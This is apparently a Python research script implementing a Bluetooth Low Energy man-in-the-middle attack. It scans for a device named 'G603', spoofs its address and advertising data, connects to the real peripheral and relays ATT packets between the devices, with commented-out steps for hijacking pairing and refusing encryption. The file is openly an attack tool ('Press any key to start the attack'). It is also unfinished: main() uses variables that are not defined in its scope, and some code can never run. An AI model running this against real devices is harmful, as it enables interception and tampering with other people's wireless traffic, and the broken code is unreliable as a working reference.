import asyncio
import logging
import sys
import time

from ble import Device
from constants import (
    BLE_L2CAP_CID_ATT,
    BLE_L2CAP_CID_SM,
    BLE_ROLE_CENTRAL,
    BLE_ROLE_PERIPHERAL,
)
from helpers import (
    HCI_Cmd_LE_Custom_Command,
    HCI_Cmd_LE_Set_Public_Address,
    SM_Security_Request,
    l2cap_send,
)
from scapy.layers.bluetooth import (
    ATT_Read_By_Group_Type_Response,
    HCI_Hdr,
    HCI_LE_Meta_Connection_Complete,
    HCI_LE_Meta_Connection_Update_Complete,
    L2CAP_Connection_Parameter_Update_Request,
    SM_DHKey_Check,
    SM_Pairing_Request,
    SM_Pairing_Response,
    SM_Public_Key,
)

# authreq = bonding << 0 | mitm << 2 | sc << 3 | keypress << 4


class Mitm:
    peripheral_task = None
    central_task = None

    def __init__(
        self,
        peripheral_addr=None,
        peripheral_addr_type=1,
        central_addr=None,
        central_addr_type=0,
    ):
        self.peripheral = Device(
            id=1,
            role=BLE_ROLE_PERIPHERAL,
            addr=peripheral_addr,
            addr_type=peripheral_addr_type,
        )
        self.central = Device(
            id=2, role=BLE_ROLE_CENTRAL, addr=central_addr, addr_type=central_addr_type
        )

        self.waiting_msg_from = None
        self.transparent = True

    def on_central_rx(self):
        pkt = self.central.receive()
        if pkt is None:
            return

        if pkt.type != 2:
            return

        if pkt.cid == BLE_L2CAP_CID_ATT:
            self.peripheral.forward(pkt)
            # TODO: Check if the packet needs a response
            self.waiting_msg_from = self.peripheral.id
        elif pkt.cid == BLE_L2CAP_CID_SM:
            return
            # Pairing remains local
            pkt = self.central.sm.smp_on_message_rx(pkt)
            self.central.sm_send(pkt)
            # if wait_rsp:
            #     self.waiting_msg_from = self.peripheral.id
            # else:
            #     self.waiting_msg_from = self.central.id

    async def handle_peripheral_pairing(self, pkt):
        rsp = self.peripheral.sm.smp_on_message_rx(pkt)
        for p in rsp:
            self.peripheral.sm_send(p)

    def on_peripheral_rx(self):
        pkt = self.peripheral.receive()
        if pkt is None:
            return

        if pkt.type == 2:
            if pkt.cid == BLE_L2CAP_CID_ATT:
                self.central.forward(pkt)
                # TODO: Check if the packet needs a response
                self.waiting_msg_from = self.central.id
            elif pkt.cid == BLE_L2CAP_CID_SM:
                if SM_Pairing_Request in pkt:
                    pass
                #     self.central.sm.pair()
                # I should start a thread to handle the pairing in the background since it is separate
                # Pairing remains local

            # if wait_rsp:
            #     self.waiting_msg_from = self.central.id
            # else:
            #     self.waiting_msg_from = self.peripheral.id

        # if pkt.type == 4 and not self.transparent:
        #     if pkt.getlayer(HCI_LE_Meta_Connection_Update_Complete) is not None:
        #         if int(pkt.status) == 255:
        #             authreq = 1 << 0 | 1 << 2 | 1 << 3 | 0 << 4
        #             self.peripheral.sm_send(SM_Security_Request(authentication=authreq))
        #             self.waiting_msg_from = self.peripheral.id
        #             return

        # Forward to Central
        # self.central.forward(pkt)
        # self.waiting_msg_from = self.central.id

    def on_message_rx(self, pkt, src):
        # Central
        if src == BLE_ROLE_CENTRAL:
            pkt = self.central.on_message_rx()
            if pkt is not None:
                self.peripheral.forward(pkt)
                return
        # Peripheral
        elif src == BLE_ROLE_PERIPHERAL:
            pkt = self.peripheral.on_message_rx(pkt)
            # if pkt is not None and SM_Pairing_Request in pkt:
            #     print("We received pairing req, starting MITM")
            #     self.peripheral.forwarding = False
            #     self.peripheral.start_pairing(pkt)
            #     # self.peripheral.on_message_rx(pkt)
            #     self.peripheral.forwarding = True
            #     # await self.peripheral.pairing_task
            #     self.central.forwarding = False
            #     self.central.start_pairing()
            #     self.central.forwarding = True

            # await self.peripheral.pairing_task
            # await self.central.pairing_task

            if pkt is not None:
                self.central.forward(pkt)


def foward_to_dev(dev_from: Device, dev_to: Device):
    logging.info(f"Forwarding from {dev_from.role} to {dev_to.role}")
    while True:
        pkt = dev_from.on_message_rx(dev_from.receive())
        if pkt is not None:
            dev_to.forward(pkt)


async def main(mitm: Mitm):
    # Create background tasks for forwarding
    peripheral_task = asyncio.create_task(
        asyncio.to_thread(foward_to_dev, mitm.peripheral, mitm.central)
    )
    central_task = asyncio.create_task(
        asyncio.to_thread(foward_to_dev, mitm.central, mitm.peripheral)
    )

    # We tell Peripheral controller to reject enc reqs
    # mitm.peripheral.hci_send_cmd(HCI_Cmd_LE_Custom_Command(opcode=0))

    # Start advertising with malicious Peripheral and wait for the connection

    mitm.central.connect(mitm.peripheral.addr, mitm.peripheral.addr_type)

    # prph_addr = prph_addr[:-1] + "7"

    mitm.peripheral.set_peripheral_mode(
        addr=mitm.peripheral.addr, addr_type=prph_addr_type, adv_data=adv_data
    )

    # TODO: maybe async this to start pairing in the background once the connection is established

    mitm.central.start_pairing(False)

    # False means we do not block

    # Store the tasks in the Mitm instance so we can manage them later
    mitm.peripheral_task = peripheral_task
    mitm.central_task = central_task

    # Return the tasks in case we need to cancel or await them later
    return peripheral_task, central_task


if __name__ == "__main__":
    mitm = Mitm(
        # central_addr="F8:1A:2B:3F:27:2F",
        central_addr="50:ED:3C:00:BC:BA",
        central_addr_type=0,
    )

    # Enable or disable packets passthru
    mitm.transparent = True

    mitm.central.initialize()

    # Connect to legitimate Peripheral to stop its advertising
    # do not pair yet
    prph_addr, prph_addr_type, adv_data = mitm.central.start_targeted_scan(
        bname="G603", get_data=True
    )

    mitm.peripheral.addr = prph_addr
    mitm.peripheral.addr_type = prph_addr_type

    mitm.peripheral.initialize()

    mitm.peripheral.forwarding = True
    mitm.central.forwarding = True

    input("Press any key to start the attack...")

    # Start background listening tasks
    tasks = asyncio.run(main(mitm))

    # asyncio.run(main(mitm))
    # Legitimate Central is connected, wait for packets

    # Send security request to the Central
    # sec_req = mitm.peripheral.sm.pair()
    # mitm.peripheral.sm_send(sec_req)

    # # Async routine to handle connection and get address
    # # mitm.peripheral.spoof_peripheral(addr=targets["p"])
    # mitm.peripheral.set_peripheral_mode()
    # print("Peripheral advertising")
    # # Set reject encryption flag
    # # if not mitm.transparent:
    # #     mitm.peripheral.hci_send_cmd(HCI_Cmd_LE_Custom_Command(opcode=0))

    # mitm.waiting_msg_from = mitm.peripheral.id
    # # This should do the rest
    # while True:
    #     mitm.on_message_rx()
